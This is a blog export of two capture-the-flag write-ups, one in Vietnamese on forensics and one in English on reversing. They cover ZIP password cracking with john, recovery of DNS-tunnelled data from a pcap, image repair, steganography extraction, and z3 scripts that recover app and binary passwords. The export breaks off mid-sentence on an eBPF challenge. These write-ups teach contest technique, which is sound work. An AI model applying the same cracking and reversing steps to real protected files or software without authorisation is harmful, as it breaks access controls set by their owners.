[{"content":"N√≥i th·∫≠t th√¨ ƒë√¢y l√† 1 gi·∫£i kh√° kh√≥ ch·ªãu v·ªõi m√¨nh, v√¨ ngo√†i ƒë·ªô guessing c·ªßa c√°c th·ª≠ th√°ch (forensics, mobile) th√¨ th·∫≠t ra ch·∫≥ng c√≥ g√¨ ƒë·ªÉ n√≥i c·∫£ (v√† r·∫•t ti·∫øc v·ªõi 1 m√¨nh m√¨nh l√†m th√¨ kh√¥ng th·ªÉ gi·∫£i quy·∫øt ƒë∆∞·ª£c to√†n b·ªô c√πng 1 l√∫c)\nLoot Puppey Description: This is my lost puppey. He is trying to hide himself and hide something from me. Can you find them for me?\nAttachment: Lost.docx\nƒê·ªÅ b√†i cho m√¨nh 1 file docx, d·ª±a v√†o ƒë·ªÅ b√†i ƒë·ªÉ t√¨m xem th·ª© g√¨ b·ªã ·∫©n gi·∫•u th√¨ v·ªõi kinh nghi·ªám m√¨nh s·∫Ω unzip n√≥ ra\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/Desktop/cstv] ‚îî‚îÄ# unzip Lost.docx Archive: Lost.docx inflating: [Content_Types].xml inflating: _rels/.rels inflating: word/_rels/document.xml.rels inflating: word/document.xml extracting: word/media/image1.jpg extracting: word/media/image2.jpg inflating: word/theme/theme1.xml inflating: word/settings.xml inflating: docProps/core.xml inflating: docProps/app.xml inflating: word/webSettings.xml inflating: word/styles.xml inflating: word/fontTable.xml ·ªû ƒë√¢y ƒë·ªÉ √Ω r·∫±ng c√≥ 2 file media trong th∆∞ m·ª•c word/media/\nC√≥ v·∫ª nh∆∞ image1.jpg ƒëang b·ªã corrupt, m√¨nh s·∫Ω ki·ªÉm tra c√°c byte v√† header xem c√≥ v·∫•n ƒë·ªÅ g√¨ kh√¥ng\n1 2 3 4 5 6 7 8 9 10 11 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Desktop/cstv/word/media] ‚îî‚îÄ# xxd image1.jpg 00000000: 504b 0304 1400 0900 0800 d922 0955 4ac4 PK.........\u0026#34;.UJ. 00000010: 894f 8fde 0200 59e1 0200 0800 1c00 7465 .O....Y.......te 00000020: 7374 2e6a 7067 5554 0900 035a 19f2 620f st.jpgUT...Z..b. 00000030: 1af2 6275 780b 0001 04e8 0300 0004 e803 ..bux........... 00000040: 0000 413d 3e5e 82e4 e725 28b6 3da2 ab50 ..A=\u0026gt;^...%(.=..P 00000050: f6e0 2ad2 47c4 a8af 7599 2983 861a 5c2e ..*.G...u.)...\\. 00000060: 7ec5 636d 2019 9865 db00 2663 779f afff ~.cm ..e..\u0026amp;cw... 00000070: 18a2 0efe 5ef0 ab03 f443 dd7d 84a4 ba16 ....^....C.}.... 00000080: d23d b327 64b3 6c03 7be3 d7e3 77b2 7d38 .=.\u0026#39;d.l.{...w.}8 Yah, v·∫≠y n√≥ th·ª±c ch·∫•t l√† 1 file ZIP, ƒë·∫øn ƒë√¢y c·∫ßn gi·∫£i n√©n n√≥ ra nh∆∞ng xu·∫•t hi·ªán th√™m 1 v·∫•n ƒë·ªÅ m·ªõi: password c·ªßa file ZIP, v·ªõi ƒë·ªô l·ªè n√†y th√¨ ch·∫°y tools zip2john ch·∫Øc l√† ƒë∆∞·ª£c r·ªìi\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Desktop/cstv/word/media] ‚îî‚îÄ# zip2john image1.zip \u0026gt; hash.txt Created directory: /root/.john ver 2.0 efh 5455 efh 7875 image1.zip/test.jpg PKZIP Encr: TS_chk, cmplen=188047, decmplen=188761, crc=4F89C44A ts=22D9 cs=22d9 type=8 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/Desktop/cstv/word/media] ‚îî‚îÄ# john hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst loveyou (image1.zip/test.jpg) 1g 0:00:00:00 DONE 2/3 (2024-01-06 18:19) 33.33g/s 1587Kp/s 1587Kc/s 1587KC/s 123456..ferrises Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. V·∫≠y m·∫≠t kh·∫©u file ZIP n√†y l√† loveyou sau khi gi·∫£i n√©n ra th√¨ ƒë∆∞·ª£c c√°i ·∫£nh test.png\nV·ªõi JPG th√¨ m√¨nh kh√¥ng nghƒ© nhi·ªÅu cho l·∫Øm, n√©m l√™n Aperi\u0026rsquo;Solve cho t·ª± x·ª≠ l√Ω n·ªët\nflag: hackathon{bbc649da49b02570835df50fd173bff7d4933f07}\nWhose name is it? Description: I fell like there are many people drawing my secret\u0026hellip;\nAttachment: capture.pcap\n·ªû chall th·ª© 2 th√¨ c√≥ v·∫ª ƒë√∫ng h∆°n 1 ch√∫t v·ªõi c√°i nghƒ©a forensics \u0026hellip;\nSau khi check c√°c object xu·∫•t hi·ªán trong l∆∞u l∆∞·ª£ng m·∫°ng th√¨ th·∫•y c√≥ 1 file th·ª±c thi (m√¨nh ƒë√£ rev n√≥ + decompile th·ª≠) nh∆∞ng m√† kh√¥ng c√≥ g√¨ ƒë·ªÉ \u0026ldquo;khai th√°c\u0026rdquo; n√™n chuy·ªÉn h∆∞·ªõng qua ph∆∞∆°ng √°n kh√°c\nTrong qu√° tr√¨nh t√¨m ki·∫øm th√¨ m√¨nh c√≥ th·∫•y trong udp stream xu·∫•t hi·ªán vi·ªác g·ª≠i nh·∫≠n 1 txt n√†o ƒë√≥ kh√° kh·∫£ nghi\nB·∫Øt th·ª≠ 1 query trong ƒë√≥ v√† decode th·ª≠ theo th√≥i quen th√¨ th·∫•y r·∫±ng ƒë√¢y l√† header c·ªßa 1 file ZIP, th·∫•y c√≥ hope n√™n theo h∆∞·ªõng n√†y lu√¥n\nV·∫≠y vi·ªác c·ªßa m√¨nh b√¢y gi·ªù ch·ªâ l√† filter to√†n b·ªô c√°c udp.stream t·ª´ 188 ƒë·∫øn 1569 (k·∫øt th√∫c) ƒë·ªÉ filter v·ªõi dns \u0026amp;\u0026amp; udp.stream \u0026gt;= 188 \u0026amp;\u0026amp; udp.stream \u0026lt;= 1569 v√† vi·∫øt script ƒë·ªÉ lo·∫°i b·ªè c√°c ph·∫ßn th·ª´a r·ªìi n√©m qua cyberchef cho x·ª≠ l√Ω n·ªët\nscript:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import re pattern = re.compile(r\u0026#39;\\b(\\d+\\.\\d+[a-fA-F\\d]+)\\.\\w+\\.\\w+\\.\\w+\\b\u0026#39;) with open(\u0026#34;dnsfilter.txt\u0026#34;,\u0026#34;r\u0026#34;) as f: input_text= f.read(); match = re.findall(pattern,input_text) with open(\u0026#34;output.txt\u0026#34;, \u0026#34;w\u0026#34;) as output_file: # C√°c queries tr√πng l·∫∑p 6 l·∫ßn, lo·∫°i b·ªè b·ªõt for m in range(0, len(match), 6): output_file.write(match[m].split(\u0026#39;.\u0026#39;)[1]) flag: CSTV_2023_{ba69f4c8c869295a9a8024b32a177bc63a942ffd}\nL4ggg Description: Can you deal with the lagging. If you can f the lag You will get the flag.\nAttachment: 3y3L4g \u0026amp; 34rL4g.wav\n·ªû th·ª≠ th√°ch for cu·ªëi c√πng n√†y th√¨ m√¨nh nh·∫≠n ƒë∆∞·ª£c 2 file (1 wav v√† 1 file data), v·ªõi kinh nghi·ªám th√¨ m√¨nh xi√™n ƒë∆∞·ª£c file WAV ƒë·∫ßu ti√™n b·∫±ng vi·ªác xem ·∫£nh ph·ªï c·ªßa √¢m thanh\nNh√¨n qua th√¨ th·∫•y r·∫±ng ƒë√¢y l√† 1 ƒëo·∫°n m√£ Morse ƒë∆°n gi·∫£n \u0026ndash;\u0026gt; WH4TY0UH34R1SN0TWH4TY0US33KF0R, c√°i n√†y ch·∫Øc l√† ƒë·ªÉ d√πng sau v√¨ c√≤n 1 file m·∫Øt lag n·ªØa (m√¨nh nghi l√† file ·∫£nh)\nD·ª±a v√†o header c·ªßa file n√†y th√¨ ƒë√∫ng l√† c√°c byte ƒë√£ b·ªã s·ª≠a v√† b·∫£n g·ªëc l√† 1 file ·∫£nh PNG, m√¨nh s·∫Ω s·ª≠a l·∫°i header tr∆∞·ªõc th√†nh PNG\nNgo√†i ra th√¨ c√≤n 1 th·ª© khi·∫øn m√¨nh ƒë·ªÉ √Ω n·ªØa l√† 1HdR, kh·∫£ nƒÉng l√† b·ªã l·ªói chunk (IHDR)\n·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng tool: PNG-Fixer ƒë·ªÉ ki·ªÉm tra c√°c chunk c√≥ v·∫•n ƒë·ªÅ\nV·∫≠y l√† t·ª´ ƒë√¢y th√¨ bi·∫øt ƒë∆∞·ª£c c√≥ 2 chunk b·ªã sai l√† 1HdR v√† IPAD (IHDR v√† IDAT) ti·∫øn h√†nh s·ª≠a l·∫°i to√†n b·ªô (b·∫±ng HexEd)\nSau khi fix xong chunk th√¨ s·∫Ω chuy·ªÉn qua [PCRT](ƒë·ªÉ ki·ªÉm tra c√°c t·ªïng quan c√°c byte)\nM√¨nh v·ª´a m·ªõi fix l·∫°i c√°i IPAD xong n√™n b√¢y gi·ªù c·∫ßn s·ª≠a l·∫°i IDAT chunk data length ·ªü offset 0xD0002 (b·∫±ng HexEd)\nC·ª© v·∫≠y s·ª≠a l·ªói ti·∫øp ƒë·∫øn bao gi·ªù c√≥ th·ªÉ nh√¨n ƒë∆∞·ª£c ·∫£nh (b·ªè qua b∆∞·ªõc s·ª≠a CRC chunk v√¨ ·∫£nh ban ƒë·∫ßu ƒë√£ l·ªói s·∫µn)\n·∫¢nh sau khi s·ª≠a xong: output.png\nM·ªü tr√™n Windows s·∫Ω nh√¨n th·∫•y lu√¥n ch·ª© kh√¥ng b·ªã l·ªói n·ªØa, c√≥ th·ªÉ ƒë·ªçc ƒëo·∫°n ch·ªØ tr√™n ·∫£nh l√†: M·∫Øt h∆°i lag xin th√¥ng c·∫£m v√† ƒëo·∫°n s·ªë l√† 123321232123\nƒê·∫øn hi·ªán t·∫°i th√¨ c·∫£ 2 file m√¨nh ƒë√£ khai th√°c ƒë∆∞·ª£c to√†n b·ªô file ·∫£nh (bao g·ªìm c·∫£ metadata c·ªßa ·∫£nh n·ªØa) v·∫≠y ch·ªâ c√≤n l·∫°i file wav l√† ch∆∞a th·ª±c s·ª± khai th√°c h·∫øt, v·ªõi ƒëo·∫°n key tr√™n c√≥ l·∫Ω l√† pass c·ªßa vi·ªác d√πng tool? b√†i n√†y stegano n√™n ch·∫Øc c≈©ng ch·ªâ ƒë∆∞·ª£c c√≥ th·∫ø (m√¨nh m·∫•t nhi·ªÅu th·ªùi gian suy nghƒ© ƒë·ªß h∆∞·ªõng ch·ªânh ·∫£nh c√°c ki·ªÉu \u0026hellip;)\n1 2 3 4 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/Downloads] ‚îî‚îÄ# steghide extract -sf 34rL4g.wav Enter passphrase: wrote extracted data to \u0026#34;Br41nL4g.txt\u0026#34;. yah, xong lag m·∫Øt, lag tai gi·ªù ƒë·∫øn lag n√£o, kh√¥ng bi·∫øt troll g√¨ n·ªØa ƒë√¢y \u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 +++\u0026gt;-\u0026lt;+-.-+.+-+ ++++--+---+\u0026lt;.-+ +\u0026gt;++--+--.+.--+ +++.--+--\u0026lt;+\u0026gt;--+ ++++--+---+-.-. ++++--..-.+--.\u0026lt; ++\u0026lt;+--\u0026lt;.-\u0026gt;+--\u0026lt;. ++\u0026lt;+.--+-++--.. ++\u0026lt;++--+.++.-\u0026gt;. ++\u0026lt;++--.-+++-+. [\u0026gt;-.+--+-+++-+. \u0026gt;+]-+--+-+++-+. ++\u0026gt;-+--+-+++-+. \u0026gt;+\u0026gt;-+..+-+++-+. ++\u0026gt;-.\u0026gt;\u0026gt;+-+++-+. ƒê·∫øn ƒë√¢y th√¨ m√¨nh kh√° c·∫°n l·ªùi r·ªìi, v√¨ brainfuck n√†y kh√¥ng ph·∫£i l√† n·∫°p v√†o l√† ra m√† ph·∫£i lag t√≠ n√£o n·ªØa m·ªõi ƒë∆∞·ª£c, ch·∫Øc l√† c≈©ng ƒë·ªçc theo chi·ªÅu d·ªçc gi·ªëng nh∆∞ c√°i ·∫£nh kia?\n1 2 3 4 5 6 x = \u0026#34;+++\u0026gt;-\u0026lt;+-.-+.+-+++++--+---+\u0026lt;.-++\u0026gt;++--+--.+.--++++.--+--\u0026lt;+\u0026gt;--+++++--+---+-.-.++++--..-.+--.\u0026lt;++\u0026lt;+--\u0026lt;.-\u0026gt;+--\u0026lt;.++\u0026lt;+.--+-++--..++\u0026lt;++--+.++.-\u0026gt;.++\u0026lt;++--.-+++-+.[\u0026gt;-.+--+-+++-+.\u0026gt;+]-+--+-+++-+.++\u0026gt;-+--+-+++-+.\u0026gt;+\u0026gt;-+..+-+++-+.++\u0026gt;-.\u0026gt;\u0026gt;+-+++-+.\u0026#34; for j in range(15): for i in range(j, len(x), 15): print(x[i], end = \u0026#34;\u0026#34;) # ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.++++++.-----------.++++++.\u0026lt;------------.\u0026gt;+++++.\u0026lt;------.\u0026gt;-----..++.+++++.-------.--------.\u0026lt;-.\u0026gt;+++++++++++++++++++++++.\u0026lt;.\u0026gt;----.+++++++.--.---------------.\u0026lt;.\u0026gt;++++++++++.\u0026lt;......... yah got it, gi·ªù ch·ªâ c·∫ßn chuy·ªÉn n√≥ qua sha1 r·ªìi n·ªôp flag th√¥i :3 (v√† ƒë·∫øn cu·ªëi c√πng th√¨ c√°i m√£ morse trong file wav ban ƒë·∫ßu ch·∫≥ng ƒë·ªÉ l√†m g√¨ :3)\nflag: CSTV_2023_{1d7e89b852c2ef64283df637d0a36f16c3417f18}\n","date":"2024-01-06T00:00:00Z","image":"/p/cstv-capture-the-flag-2023-forensics/featured_hu2a81619bccf73120ad57fd6bcdb25d8d_52516_120x120_fill_box_smart1_3.png","permalink":"/p/cstv-capture-the-flag-2023-forensics/","title":"CSTV - CAPTURE THE FLAG 2023 | Forensics"},{"content":"In this CTF, I didn\u0026rsquo;t get a chance to do many rev challenges, partly because I had too many deadlines, and also partly because my old machine was breaking down.\nOpen Sesame Attachment: open_sesame.apk\nHere is an easy challenge apk. Use Decompiler.com to decompile this apk file then check sources/com/example/open_sesame/MainActivity.java to find main logic of this file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 package com.example.open_sesame; import android.os.Bundle; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import androidx.appcompat.app.AppCompatActivity; import androidx.appcompat.app.AppCompatDelegate; public class MainActivity extends AppCompatActivity { private static final int[] valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; private static final String valid_user = \u0026#34;Jack Ma\u0026#34;; private Button buttonLogin; private EditText editTextPassword; private EditText editTextUsername; /* access modifiers changed from: protected */ public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_main); this.editTextUsername = (EditText) findViewById(R.id.editTextUsername); this.editTextPassword = (EditText) findViewById(R.id.editTextPassword); Button button = (Button) findViewById(R.id.buttonLogin); this.buttonLogin = button; button.setOnClickListener(new View.OnClickListener() { public void onClick(View view) { MainActivity.this.validateCredentials(); } }); } /* access modifiers changed from: private */ public void validateCredentials() { String trim = this.editTextUsername.getText().toString().trim(); String trim2 = this.editTextPassword.getText().toString().trim(); if (!trim.equals(valid_user) || !n4ut1lus(trim2)) { showToast(\u0026#34;Invalid credentials. Please try again.\u0026#34;); return; } \u0026#34;flag{\u0026#34; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34;) + \u0026#34;}\u0026#34;; } private boolean n4ut1lus(String str) { int[] it4chi = it4chi(str); if (it4chi.length != valid_password.length) { return false; } for (int i = 0; i \u0026lt; it4chi.length; i++) { if (it4chi[i] != valid_password[i]) { return false; } } return true; } private int[] it4chi(String str) { int[] iArr = new int[str.length()]; for (int i = 0; i \u0026lt; str.length(); i++) { iArr[i] = str.charAt(i); } return iArr; } private String sh4dy(String str) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str.length(); i++) { char charAt = str.charAt(i); if (Character.isDigit(charAt)) { sb.append(charAt); } } return sb.toString(); } private int sl4y3r(String str) { return Integer.parseInt(str) - 1; } private String flag(String str, String str2) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; str2.length(); i++) { sb.append((char) (str2.charAt(i) ^ str.charAt(i % str.length()))); } return sb.toString(); } private void showToast(String str) { Toast.makeText(this, str, 0).show(); } } We should pay attention to some section:\n\u0026quot;flag{\u0026quot; + flag(Integer.toString(sl4y3r(sh4dy(trim2))), \u0026quot;U|]rURuoU^PoR_FDMo@X]uBUg\u0026quot;) + \u0026quot;}\u0026quot;; valid_password = {52, AppCompatDelegate.FEATURE_SUPPORT_ACTION_BAR, 49, 98, 97, 98, 97}; valid_user = \u0026quot;Jack Ma\u0026quot;; Here there are functions we need to pay attention to: it4chi, sh4dy, sl4y3r (each function has 1 different encoding, consisting only of simple calculations and xor operations) and valid_user \u0026amp; valid_password. Detail:\nit4chi get a string str as input and returns an array of integers sh4dy get a string str as input and returns a new string containing only the numeric characters from the original string sl4y3r get a string str as input, converts it to an integer using Integer.parseInt, subtracts 1 from the resulting value, and returns the result flag takes 2 strings and XOR char by char with length of shorter string Here\u0026rsquo;s my script to reverse this program to get the flag: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def get_flag(): valid_password = [52, 108, 49, 98, 97, 98, 97] valid_user = \u0026#34;Jack Ma\u0026#34; str2 = \u0026#34;U|]rURuoU^PoR_FDMo@X]uBUg\u0026#34; def it4chi(str): return [ord(c) for c in str] def sh4dy(str): return \u0026#39;\u0026#39;.join(c for c in str if c.isdigit()) def sl4y3r(str): return int(str) - 1 def flag(str, str2): return \u0026#39;\u0026#39;.join(chr(ord(str2[i]) ^ ord(str[i % len(str)])) for i in range(len(str2))) password = \u0026#39;\u0026#39;.join(chr(i) for i in valid_password) str1 = sh4dy(password) str_res = str1 str_res = str(sl4y3r(str_res)) return \u0026#34;flag{\u0026#34; + flag(str_res, str2) + \u0026#34;}\u0026#34; print(get_flag()) # flag{aLiBabA_and_forty_thiEveS} Secret Door Attachment:\nchall.out encoded.bin This is a C program written quite simply like to check the password and if correct, will decrypt the encoded file.bin to issue the flag image\ndump IDA (main function):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax char v5; // [rsp+13h] [rbp-EDh] BYREF int v6; // [rsp+14h] [rbp-ECh] int *v7; // [rsp+18h] [rbp-E8h] char v8[32]; // [rsp+20h] [rbp-E0h] BYREF char v9[32]; // [rsp+40h] [rbp-C0h] BYREF char v10[32]; // [rsp+60h] [rbp-A0h] BYREF char v11[32]; // [rsp+80h] [rbp-80h] BYREF int v12[18]; // [rsp+A0h] [rbp-60h] unsigned __int64 v13; // [rsp+E8h] [rbp-18h] v13 = __readfsqword(0x28u); if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } v6 = 0; std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v8); v12[0] = 66; v12[1] = 119; v12[2] = 101; v12[3] = 113; v12[4] = 123; v12[5] = 98; v12[6] = 114; v12[7] = 125; v12[8] = 119; v12[9] = 89; v12[10] = 115; v12[11] = 125; v12[12] = 111; v12[13] = 109; v12[14] = 62; v12[15] = 1; v12[16] = 0; while ( v6 \u0026lt;= 16 ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::push_back( v8, (unsigned int)(char)(LOBYTE(v12[v6]) ^ (v6 + 17))); ++v6; } std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9, \u0026#34;ThatsHardcoded!!!\u0026#34;, \u0026amp;v5); std::allocator\u0026lt;char\u0026gt;::~allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v11, v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v10, v8); func_5(v10, v11); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v10); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v11); v7 = (int *)operator new[](0x44uLL); v3 = func_4(v8, argv[1]); v7 = (int *)func_3(v3, v9); if ( (unsigned __int8)func_2(v7) ) func_1(*v7, v7[16]); else std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Wrong door\u0026#34;); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v9); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v8); return 0; } In this execute file, we must input 1 argv and length of argv is 17\n1 2 3 4 5 6 7 8 9 10 if ( argc != 2 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Just try to get the door\u0026#34;); exit(0); } if ( strlen(argv[1]) != 17 ) { std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;that\u0026#39;s not even a door :p\u0026#34;); exit(0); } In each iteration, v8 will append the value ((v12[i]) ^ (i + 17)) (i ascending) \u0026ndash;\u0026gt; v8 += chr((v12[i]) ^ (i + 17))\nwe can find v8:\n1 2 3 4 5 6 7 8 9 10 11 v6 = 0 v8 = \u0026#34;\u0026#34; v12 = [ 66, 119, 101, 113, 123, 98, 114, 125, 119, 89, 115, 125, 111, 109, 62, 1, 0 ] while v6 \u0026lt;= 16: v8 += chr(v12[v6] ^ (v6 + 17)) v6 += 1 print(v8) # v8 = \u0026#34;SeventeenChars!!!\u0026#34; The other side:\n1 2 3 std::allocator\u0026lt;char\u0026gt;::allocator(\u0026amp;v5); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string\u0026lt;std::allocator\u0026lt;char\u0026gt;\u0026gt;( v9,\u0026#34;ThatsHardcoded!!!\u0026#34;,\u0026amp;v5); we have v9 = \u0026quot;ThatsHardcoded!!!\u0026quot;\n1. func_5\nfunc_5 is a joke hix :((( so we can ignore it (not related to the program flow), if you want decode func_5, here is raw data dumped from IDA and script\n2. func_4\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 __int64 __fastcall func_4(__int64 a1, __int64 a2) { unsigned __int64 i; // [rsp+18h] [rbp-18h] unsigned __int64 v4; // [rsp+20h] [rbp-10h] __int64 v5; // [rsp+28h] [rbp-8h] v4 = std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::size(a1); v5 = operator new[](0x44uLL); for ( i = 0LL; i \u0026lt; v4; ++i ) *(v5 + 4 * i) = (*(a2 + i) ^ *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[]( a1, i)); return v5; } 3. func_3\n1 2 3 4 5 6 7 8 9 10 __int64 __fastcall func_3(__int64 a1, __int64 a2) { int i; // [rsp+14h] [rbp-Ch] __int64 v4; // [rsp+18h] [rbp-8h] v4 = operator new[](0x44uLL); for ( i = 0; i \u0026lt;= 16; ++i ) *(4LL * i + v4) = *std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](a2, i) ^ *(4LL * i + a1); return v4; } 4. func_2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 _BOOL8 __fastcall func_2(int *a1) { return *a1 == 78 \u0026amp;\u0026amp; a1[1] != (*a1 == 15) \u0026amp;\u0026amp; a1[2] == 120 \u0026amp;\u0026amp; a1[3] != (a1[2] == 31) \u0026amp;\u0026amp; a1[4] == 120 \u0026amp;\u0026amp; a1[5] != (a1[4] == 11) \u0026amp;\u0026amp; a1[6] == 116 \u0026amp;\u0026amp; a1[6] != (a1[7] == 6) \u0026amp;\u0026amp; a1[8] == 100 \u0026amp;\u0026amp; a1[9] != (a1[8] == 33) \u0026amp;\u0026amp; a1[10] == 99 \u0026amp;\u0026amp; a1[11] != (a1[10] == 34) \u0026amp;\u0026amp; a1[12] == 120 \u0026amp;\u0026amp; a1[13] == a1[12] \u0026amp;\u0026amp; a1[14] == 114 \u0026amp;\u0026amp; a1[15] == a1[14] + 1 \u0026amp;\u0026amp; a1[16] == 33; } so here is logic of func_3 \u0026amp; func_4:\n1 2 3 4 5 6 7 8 9 10 11 12 def func_4(a1, a2): v4 = len(a1) v5 = bytearray() for i in range(v4): v5.append((ord(a2[i]) ^ ord(a1[i])) % 256) return v5 def func_3(a1, a2): v4 = [0]*17 for i in range(17): v4[i] = ord(a2[i]) ^ a1[i] return v4 So we can find a1 to func_2 is True with z3 python then we can use func_3, func_4 to find key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 from z3 import * flags = [BitVec(f\u0026#39;char_{i}\u0026#39;, 8) for i in range(17)] unk1 = [BitVec(f\u0026#39;z1_{i}\u0026#39;, 8) for i in range(17)] s = Solver() s.add(len(flags) == 17) for i in range(17): s.add(And(flags[i] \u0026gt;= 33, flags[i] \u0026lt;= 125)) str1 = \u0026#34;SeventeenChars!!!\u0026#34; str2 = \u0026#34;ThatsHardcoded!!!\u0026#34; for i in range(17): unk1[i] = flags[i] ^ ord(str1[i]) for i in range(17): unk1[i] = unk1[i] ^ BitVecVal(ord(str2[i]), 8) condition = And( unk1[0] == 78, unk1[1] != If(unk1[0] == 15, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[2] == 120, unk1[3] != If(unk1[2] == 31, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[4] == 120, unk1[5] != If(unk1[4] == 11, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[6] == 116, unk1[7] != If(unk1[6] == 6, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[8] == 100, unk1[9] != If(unk1[8] == 33, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[10] == 99, unk1[11] != If(unk1[10] == 34, BitVecVal(1, 8), BitVecVal(0, 8)), unk1[12] == 120, unk1[13] == unk1[12], unk1[14] == 114, unk1[15] == unk1[14] + 1, unk1[16] == 33 ) s.add(condition) if s.check() == sat: m = s.model() flag = \u0026#39;\u0026#39;.join([chr(m[flags[i]].as_long()) for i in range(17)]) print(f\u0026#34;Pass: {flag}\u0026#34;) else: print(\u0026#34;No solution found!\u0026#34;) # Pass: I$o0e!p0n0d0oors! When i put it like as argv it false:\nI think $ in the key is special character in Linux, so i edit this command from ./chall.out I$o0e!p0n0d0oors! to ./chall.out $(echo SSRvMGUhcDBuMGQwb29ycyE= | base64 -d) and here is the flag:\nbaby eBPF Attachment: babyebpf.o\neBPF (extended Berkeley Packet Filter) is a technology in the Linux kernel that allows the execution of custom programs within the kernel itself. These programs are typically used for monitoring and filtering network events and can be attached to various hook points in 